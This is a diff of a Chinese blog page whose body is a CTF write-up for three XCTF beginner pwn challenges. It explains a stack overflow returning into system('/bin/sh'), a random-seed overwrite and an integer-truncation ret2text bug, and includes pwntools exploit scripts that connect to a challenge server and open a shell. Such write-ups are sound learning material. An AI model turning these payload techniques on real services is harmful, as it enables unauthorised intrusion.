@@ -17,25 +17,21 @@
                 <meta name="author" content="whistle.H">
                 <meta name="keywords" content="">
                 
-                    <meta name="description" content="开始pwn的学习之旅啦。 更新：pwn的学习一直断断续续，中间也转换使用ctf-wiki来作为主要学习平台。这篇博客只能有缘再更新了。">
+                    <meta name="description" content="开始pwn的学习之旅啦。 更新：pwn的学习一直断断续续，中间也转换使用ctf-wiki来作为主要学习平台。这篇博客只能有缘再更新了。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn-xctf-新手区wp">
-<meta property="og:url" content="http://example.com/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/index.html">
+<meta property="og:url" content="https://whistleh.github.io/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="开始pwn的学习之旅啦。 更新：pwn的学习一直断断续续，中间也转换使用ctf-wiki来作为主要学习平台。这篇博客只能有缘再更新了。">
+<meta property="og:description" content="开始pwn的学习之旅啦。 更新：pwn的学习一直断断续续，中间也转换使用ctf-wiki来作为主要学习平台。这篇博客只能有缘再更新了。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png">
 <meta property="article:published_time" content="2022-03-27T11:55:25.000Z">
-<meta property="article:modified_time" content="2024-04-29T13:07:00.448Z">
+<meta property="article:modified_time" content="2024-04-29T13:07:02.000Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="xctf">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png">
                         
                                 
                                         
@@ -83,7 +79,7 @@
                                                         <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"whistleh.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -291,28 +287,36 @@
 <span id="more"></span>
 <h2 id="一level_2">一、Level_2</h2>
 <p>pwn到手第一步，先玩一玩看看.</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" srcset="/img/loading.gif" lazyload /></p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" srcset="/img/loading.gif" lazyload /></p>
 <p>简单的输入提示，基本上获得不了什么信息。</p>
 <p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>
-<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call system 和 read，这给了我们布栈的空间。</p>
+<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有
+call system 和 read，这给了我们布栈的空间。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804844b &lt;+0&gt;:	push   ebp<br>0x0804844c &lt;+1&gt;:	mov    ebp,esp<br>0x0804844e &lt;+3&gt;:	sub    esp,0x88<br>0x08048454 &lt;+9&gt;:	sub    esp,0xc<br>0x08048457 &lt;+12&gt;:	push   0x8048540<br>0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;<br>0x08048461 &lt;+22&gt;:	add    esp,0x10<br>0x08048464 &lt;+25&gt;:	sub    esp,0x4<br>0x08048467 &lt;+28&gt;:	push   0x100<br>0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点<br>0x08048472 &lt;+39&gt;:	push   eax<br>0x08048473 &lt;+40&gt;:	push   0x0<br>0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;<br>0x0804847a &lt;+47&gt;:	add    esp,0x10<br>0x0804847d &lt;+50&gt;:	nop<br>0x0804847e &lt;+51&gt;:	leave  <br>0x0804847f &lt;+52&gt;:	ret  <br></code></pre></td></tr></table></figure>
-<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 "/bin/sh"的地址。</p>
-<p>当ret时，我们回到了call 0x8048320 <a href="mailto:system@plt" class="email">system@plt</a>，此时esp由于pop eip的效果，此时内部存放着"/bin/sh"的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入
+call system（0x0804845c）-&gt; 写入 "/bin/sh"的地址。</p>
+<p>当ret时，我们回到了call 0x8048320 <a href="mailto:system@plt"
+class="email">system@plt</a>，此时esp由于pop
+eip的效果，此时内部存放着"/bin/sh"的地址，这也顺利地完成了system函数的参数布置。</p>
 <p>Python的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br><span class="hljs-comment"># 111.200.241.244:65392</span><br>io = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;65392&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./xctf_2&quot;)</span><br><br>dam=<span class="hljs-string">&quot;Input:\n&quot;</span><br>ret_addr = <span class="hljs-number">0x804845c</span><br>bin_addr = <span class="hljs-number">0x804a024</span><br>fill_num = <span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)<br><br>io.sendlineafter(dam,payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
 <h2 id="二guess_num">二、guess_num</h2>
 <p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
 <p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" srcset="/img/loading.gif" lazyload /></p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" srcset="/img/loading.gif" lazyload /></p>
 <p>exp.py如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br>io=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;60037&quot;</span>)<br><br>dam=<span class="hljs-string">&quot;Your name:&quot;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x1</span>)<br>num_list = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br><br>io.sendlineafter(dam, payload)<br><br>dam_1 = <span class="hljs-string">&quot;Please input your guess number:&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    io.sendlineafter(dam_1,<span class="hljs-built_in">str</span>(num_list[i]).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
 <h2 id="三int_overflow整数溢出">三、int_overflow（整数溢出）</h2>
 <p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
 <p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" srcset="/img/loading.gif" lazyload /></p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" srcset="/img/loading.gif" lazyload /></p>
 <p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
-<p>注意到，v3是unsigned __int8 类型，当int strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
+<p>注意到，v3是unsigned __int8 类型，当int strlen(char
+*)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
 <p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
 <p>exp.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br>pwnfile = <span class="hljs-string">&quot;./xctf_4&quot;</span><br><br><span class="hljs-comment">#io=process(pwnfile)</span><br>io=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;54657&quot;</span>)<br><br>elf = ELF(pwnfile)<br><br><br>leak_func_name = <span class="hljs-string">&quot;what_is_this&quot;</span><br>leak_func_addr = elf.symbols[leak_func_name]<br><br>payload = (<span class="hljs-number">0x14</span> + <span class="hljs-number">0x04</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">0x04</span>-<span class="hljs-number">0x04</span>) * <span class="hljs-string">b&#x27;a&#x27;</span><br><br>choice = <span class="hljs-string">&quot;1&quot;</span><br>dam_0 = <span class="hljs-string">&quot;Your choice:&quot;</span><br>io.sendlineafter(dam_0, choice)<br><br>name = <span class="hljs-string">&quot;hello&quot;</span><br>dam_1 = <span class="hljs-string">&quot;Please input your username:\n&quot;</span> <br>io.sendlineafter(dam_1,name)<br><br>dam_2 = <span class="hljs-string">&quot;Please input your passwd:&quot;</span><br>io.sendlineafter(dam_2,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
@@ -368,7 +372,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>pwn-xctf-新手区wp</div>
-      <div>http://example.com/2022/03/27/blog0008-pwn-xctf-新手区wp/</div>
+      <div>https://whistleh.github.io/2022/03/27/blog0008-pwn-xctf-新手区wp/</div>
     </div>
     <div class="license-meta">
       
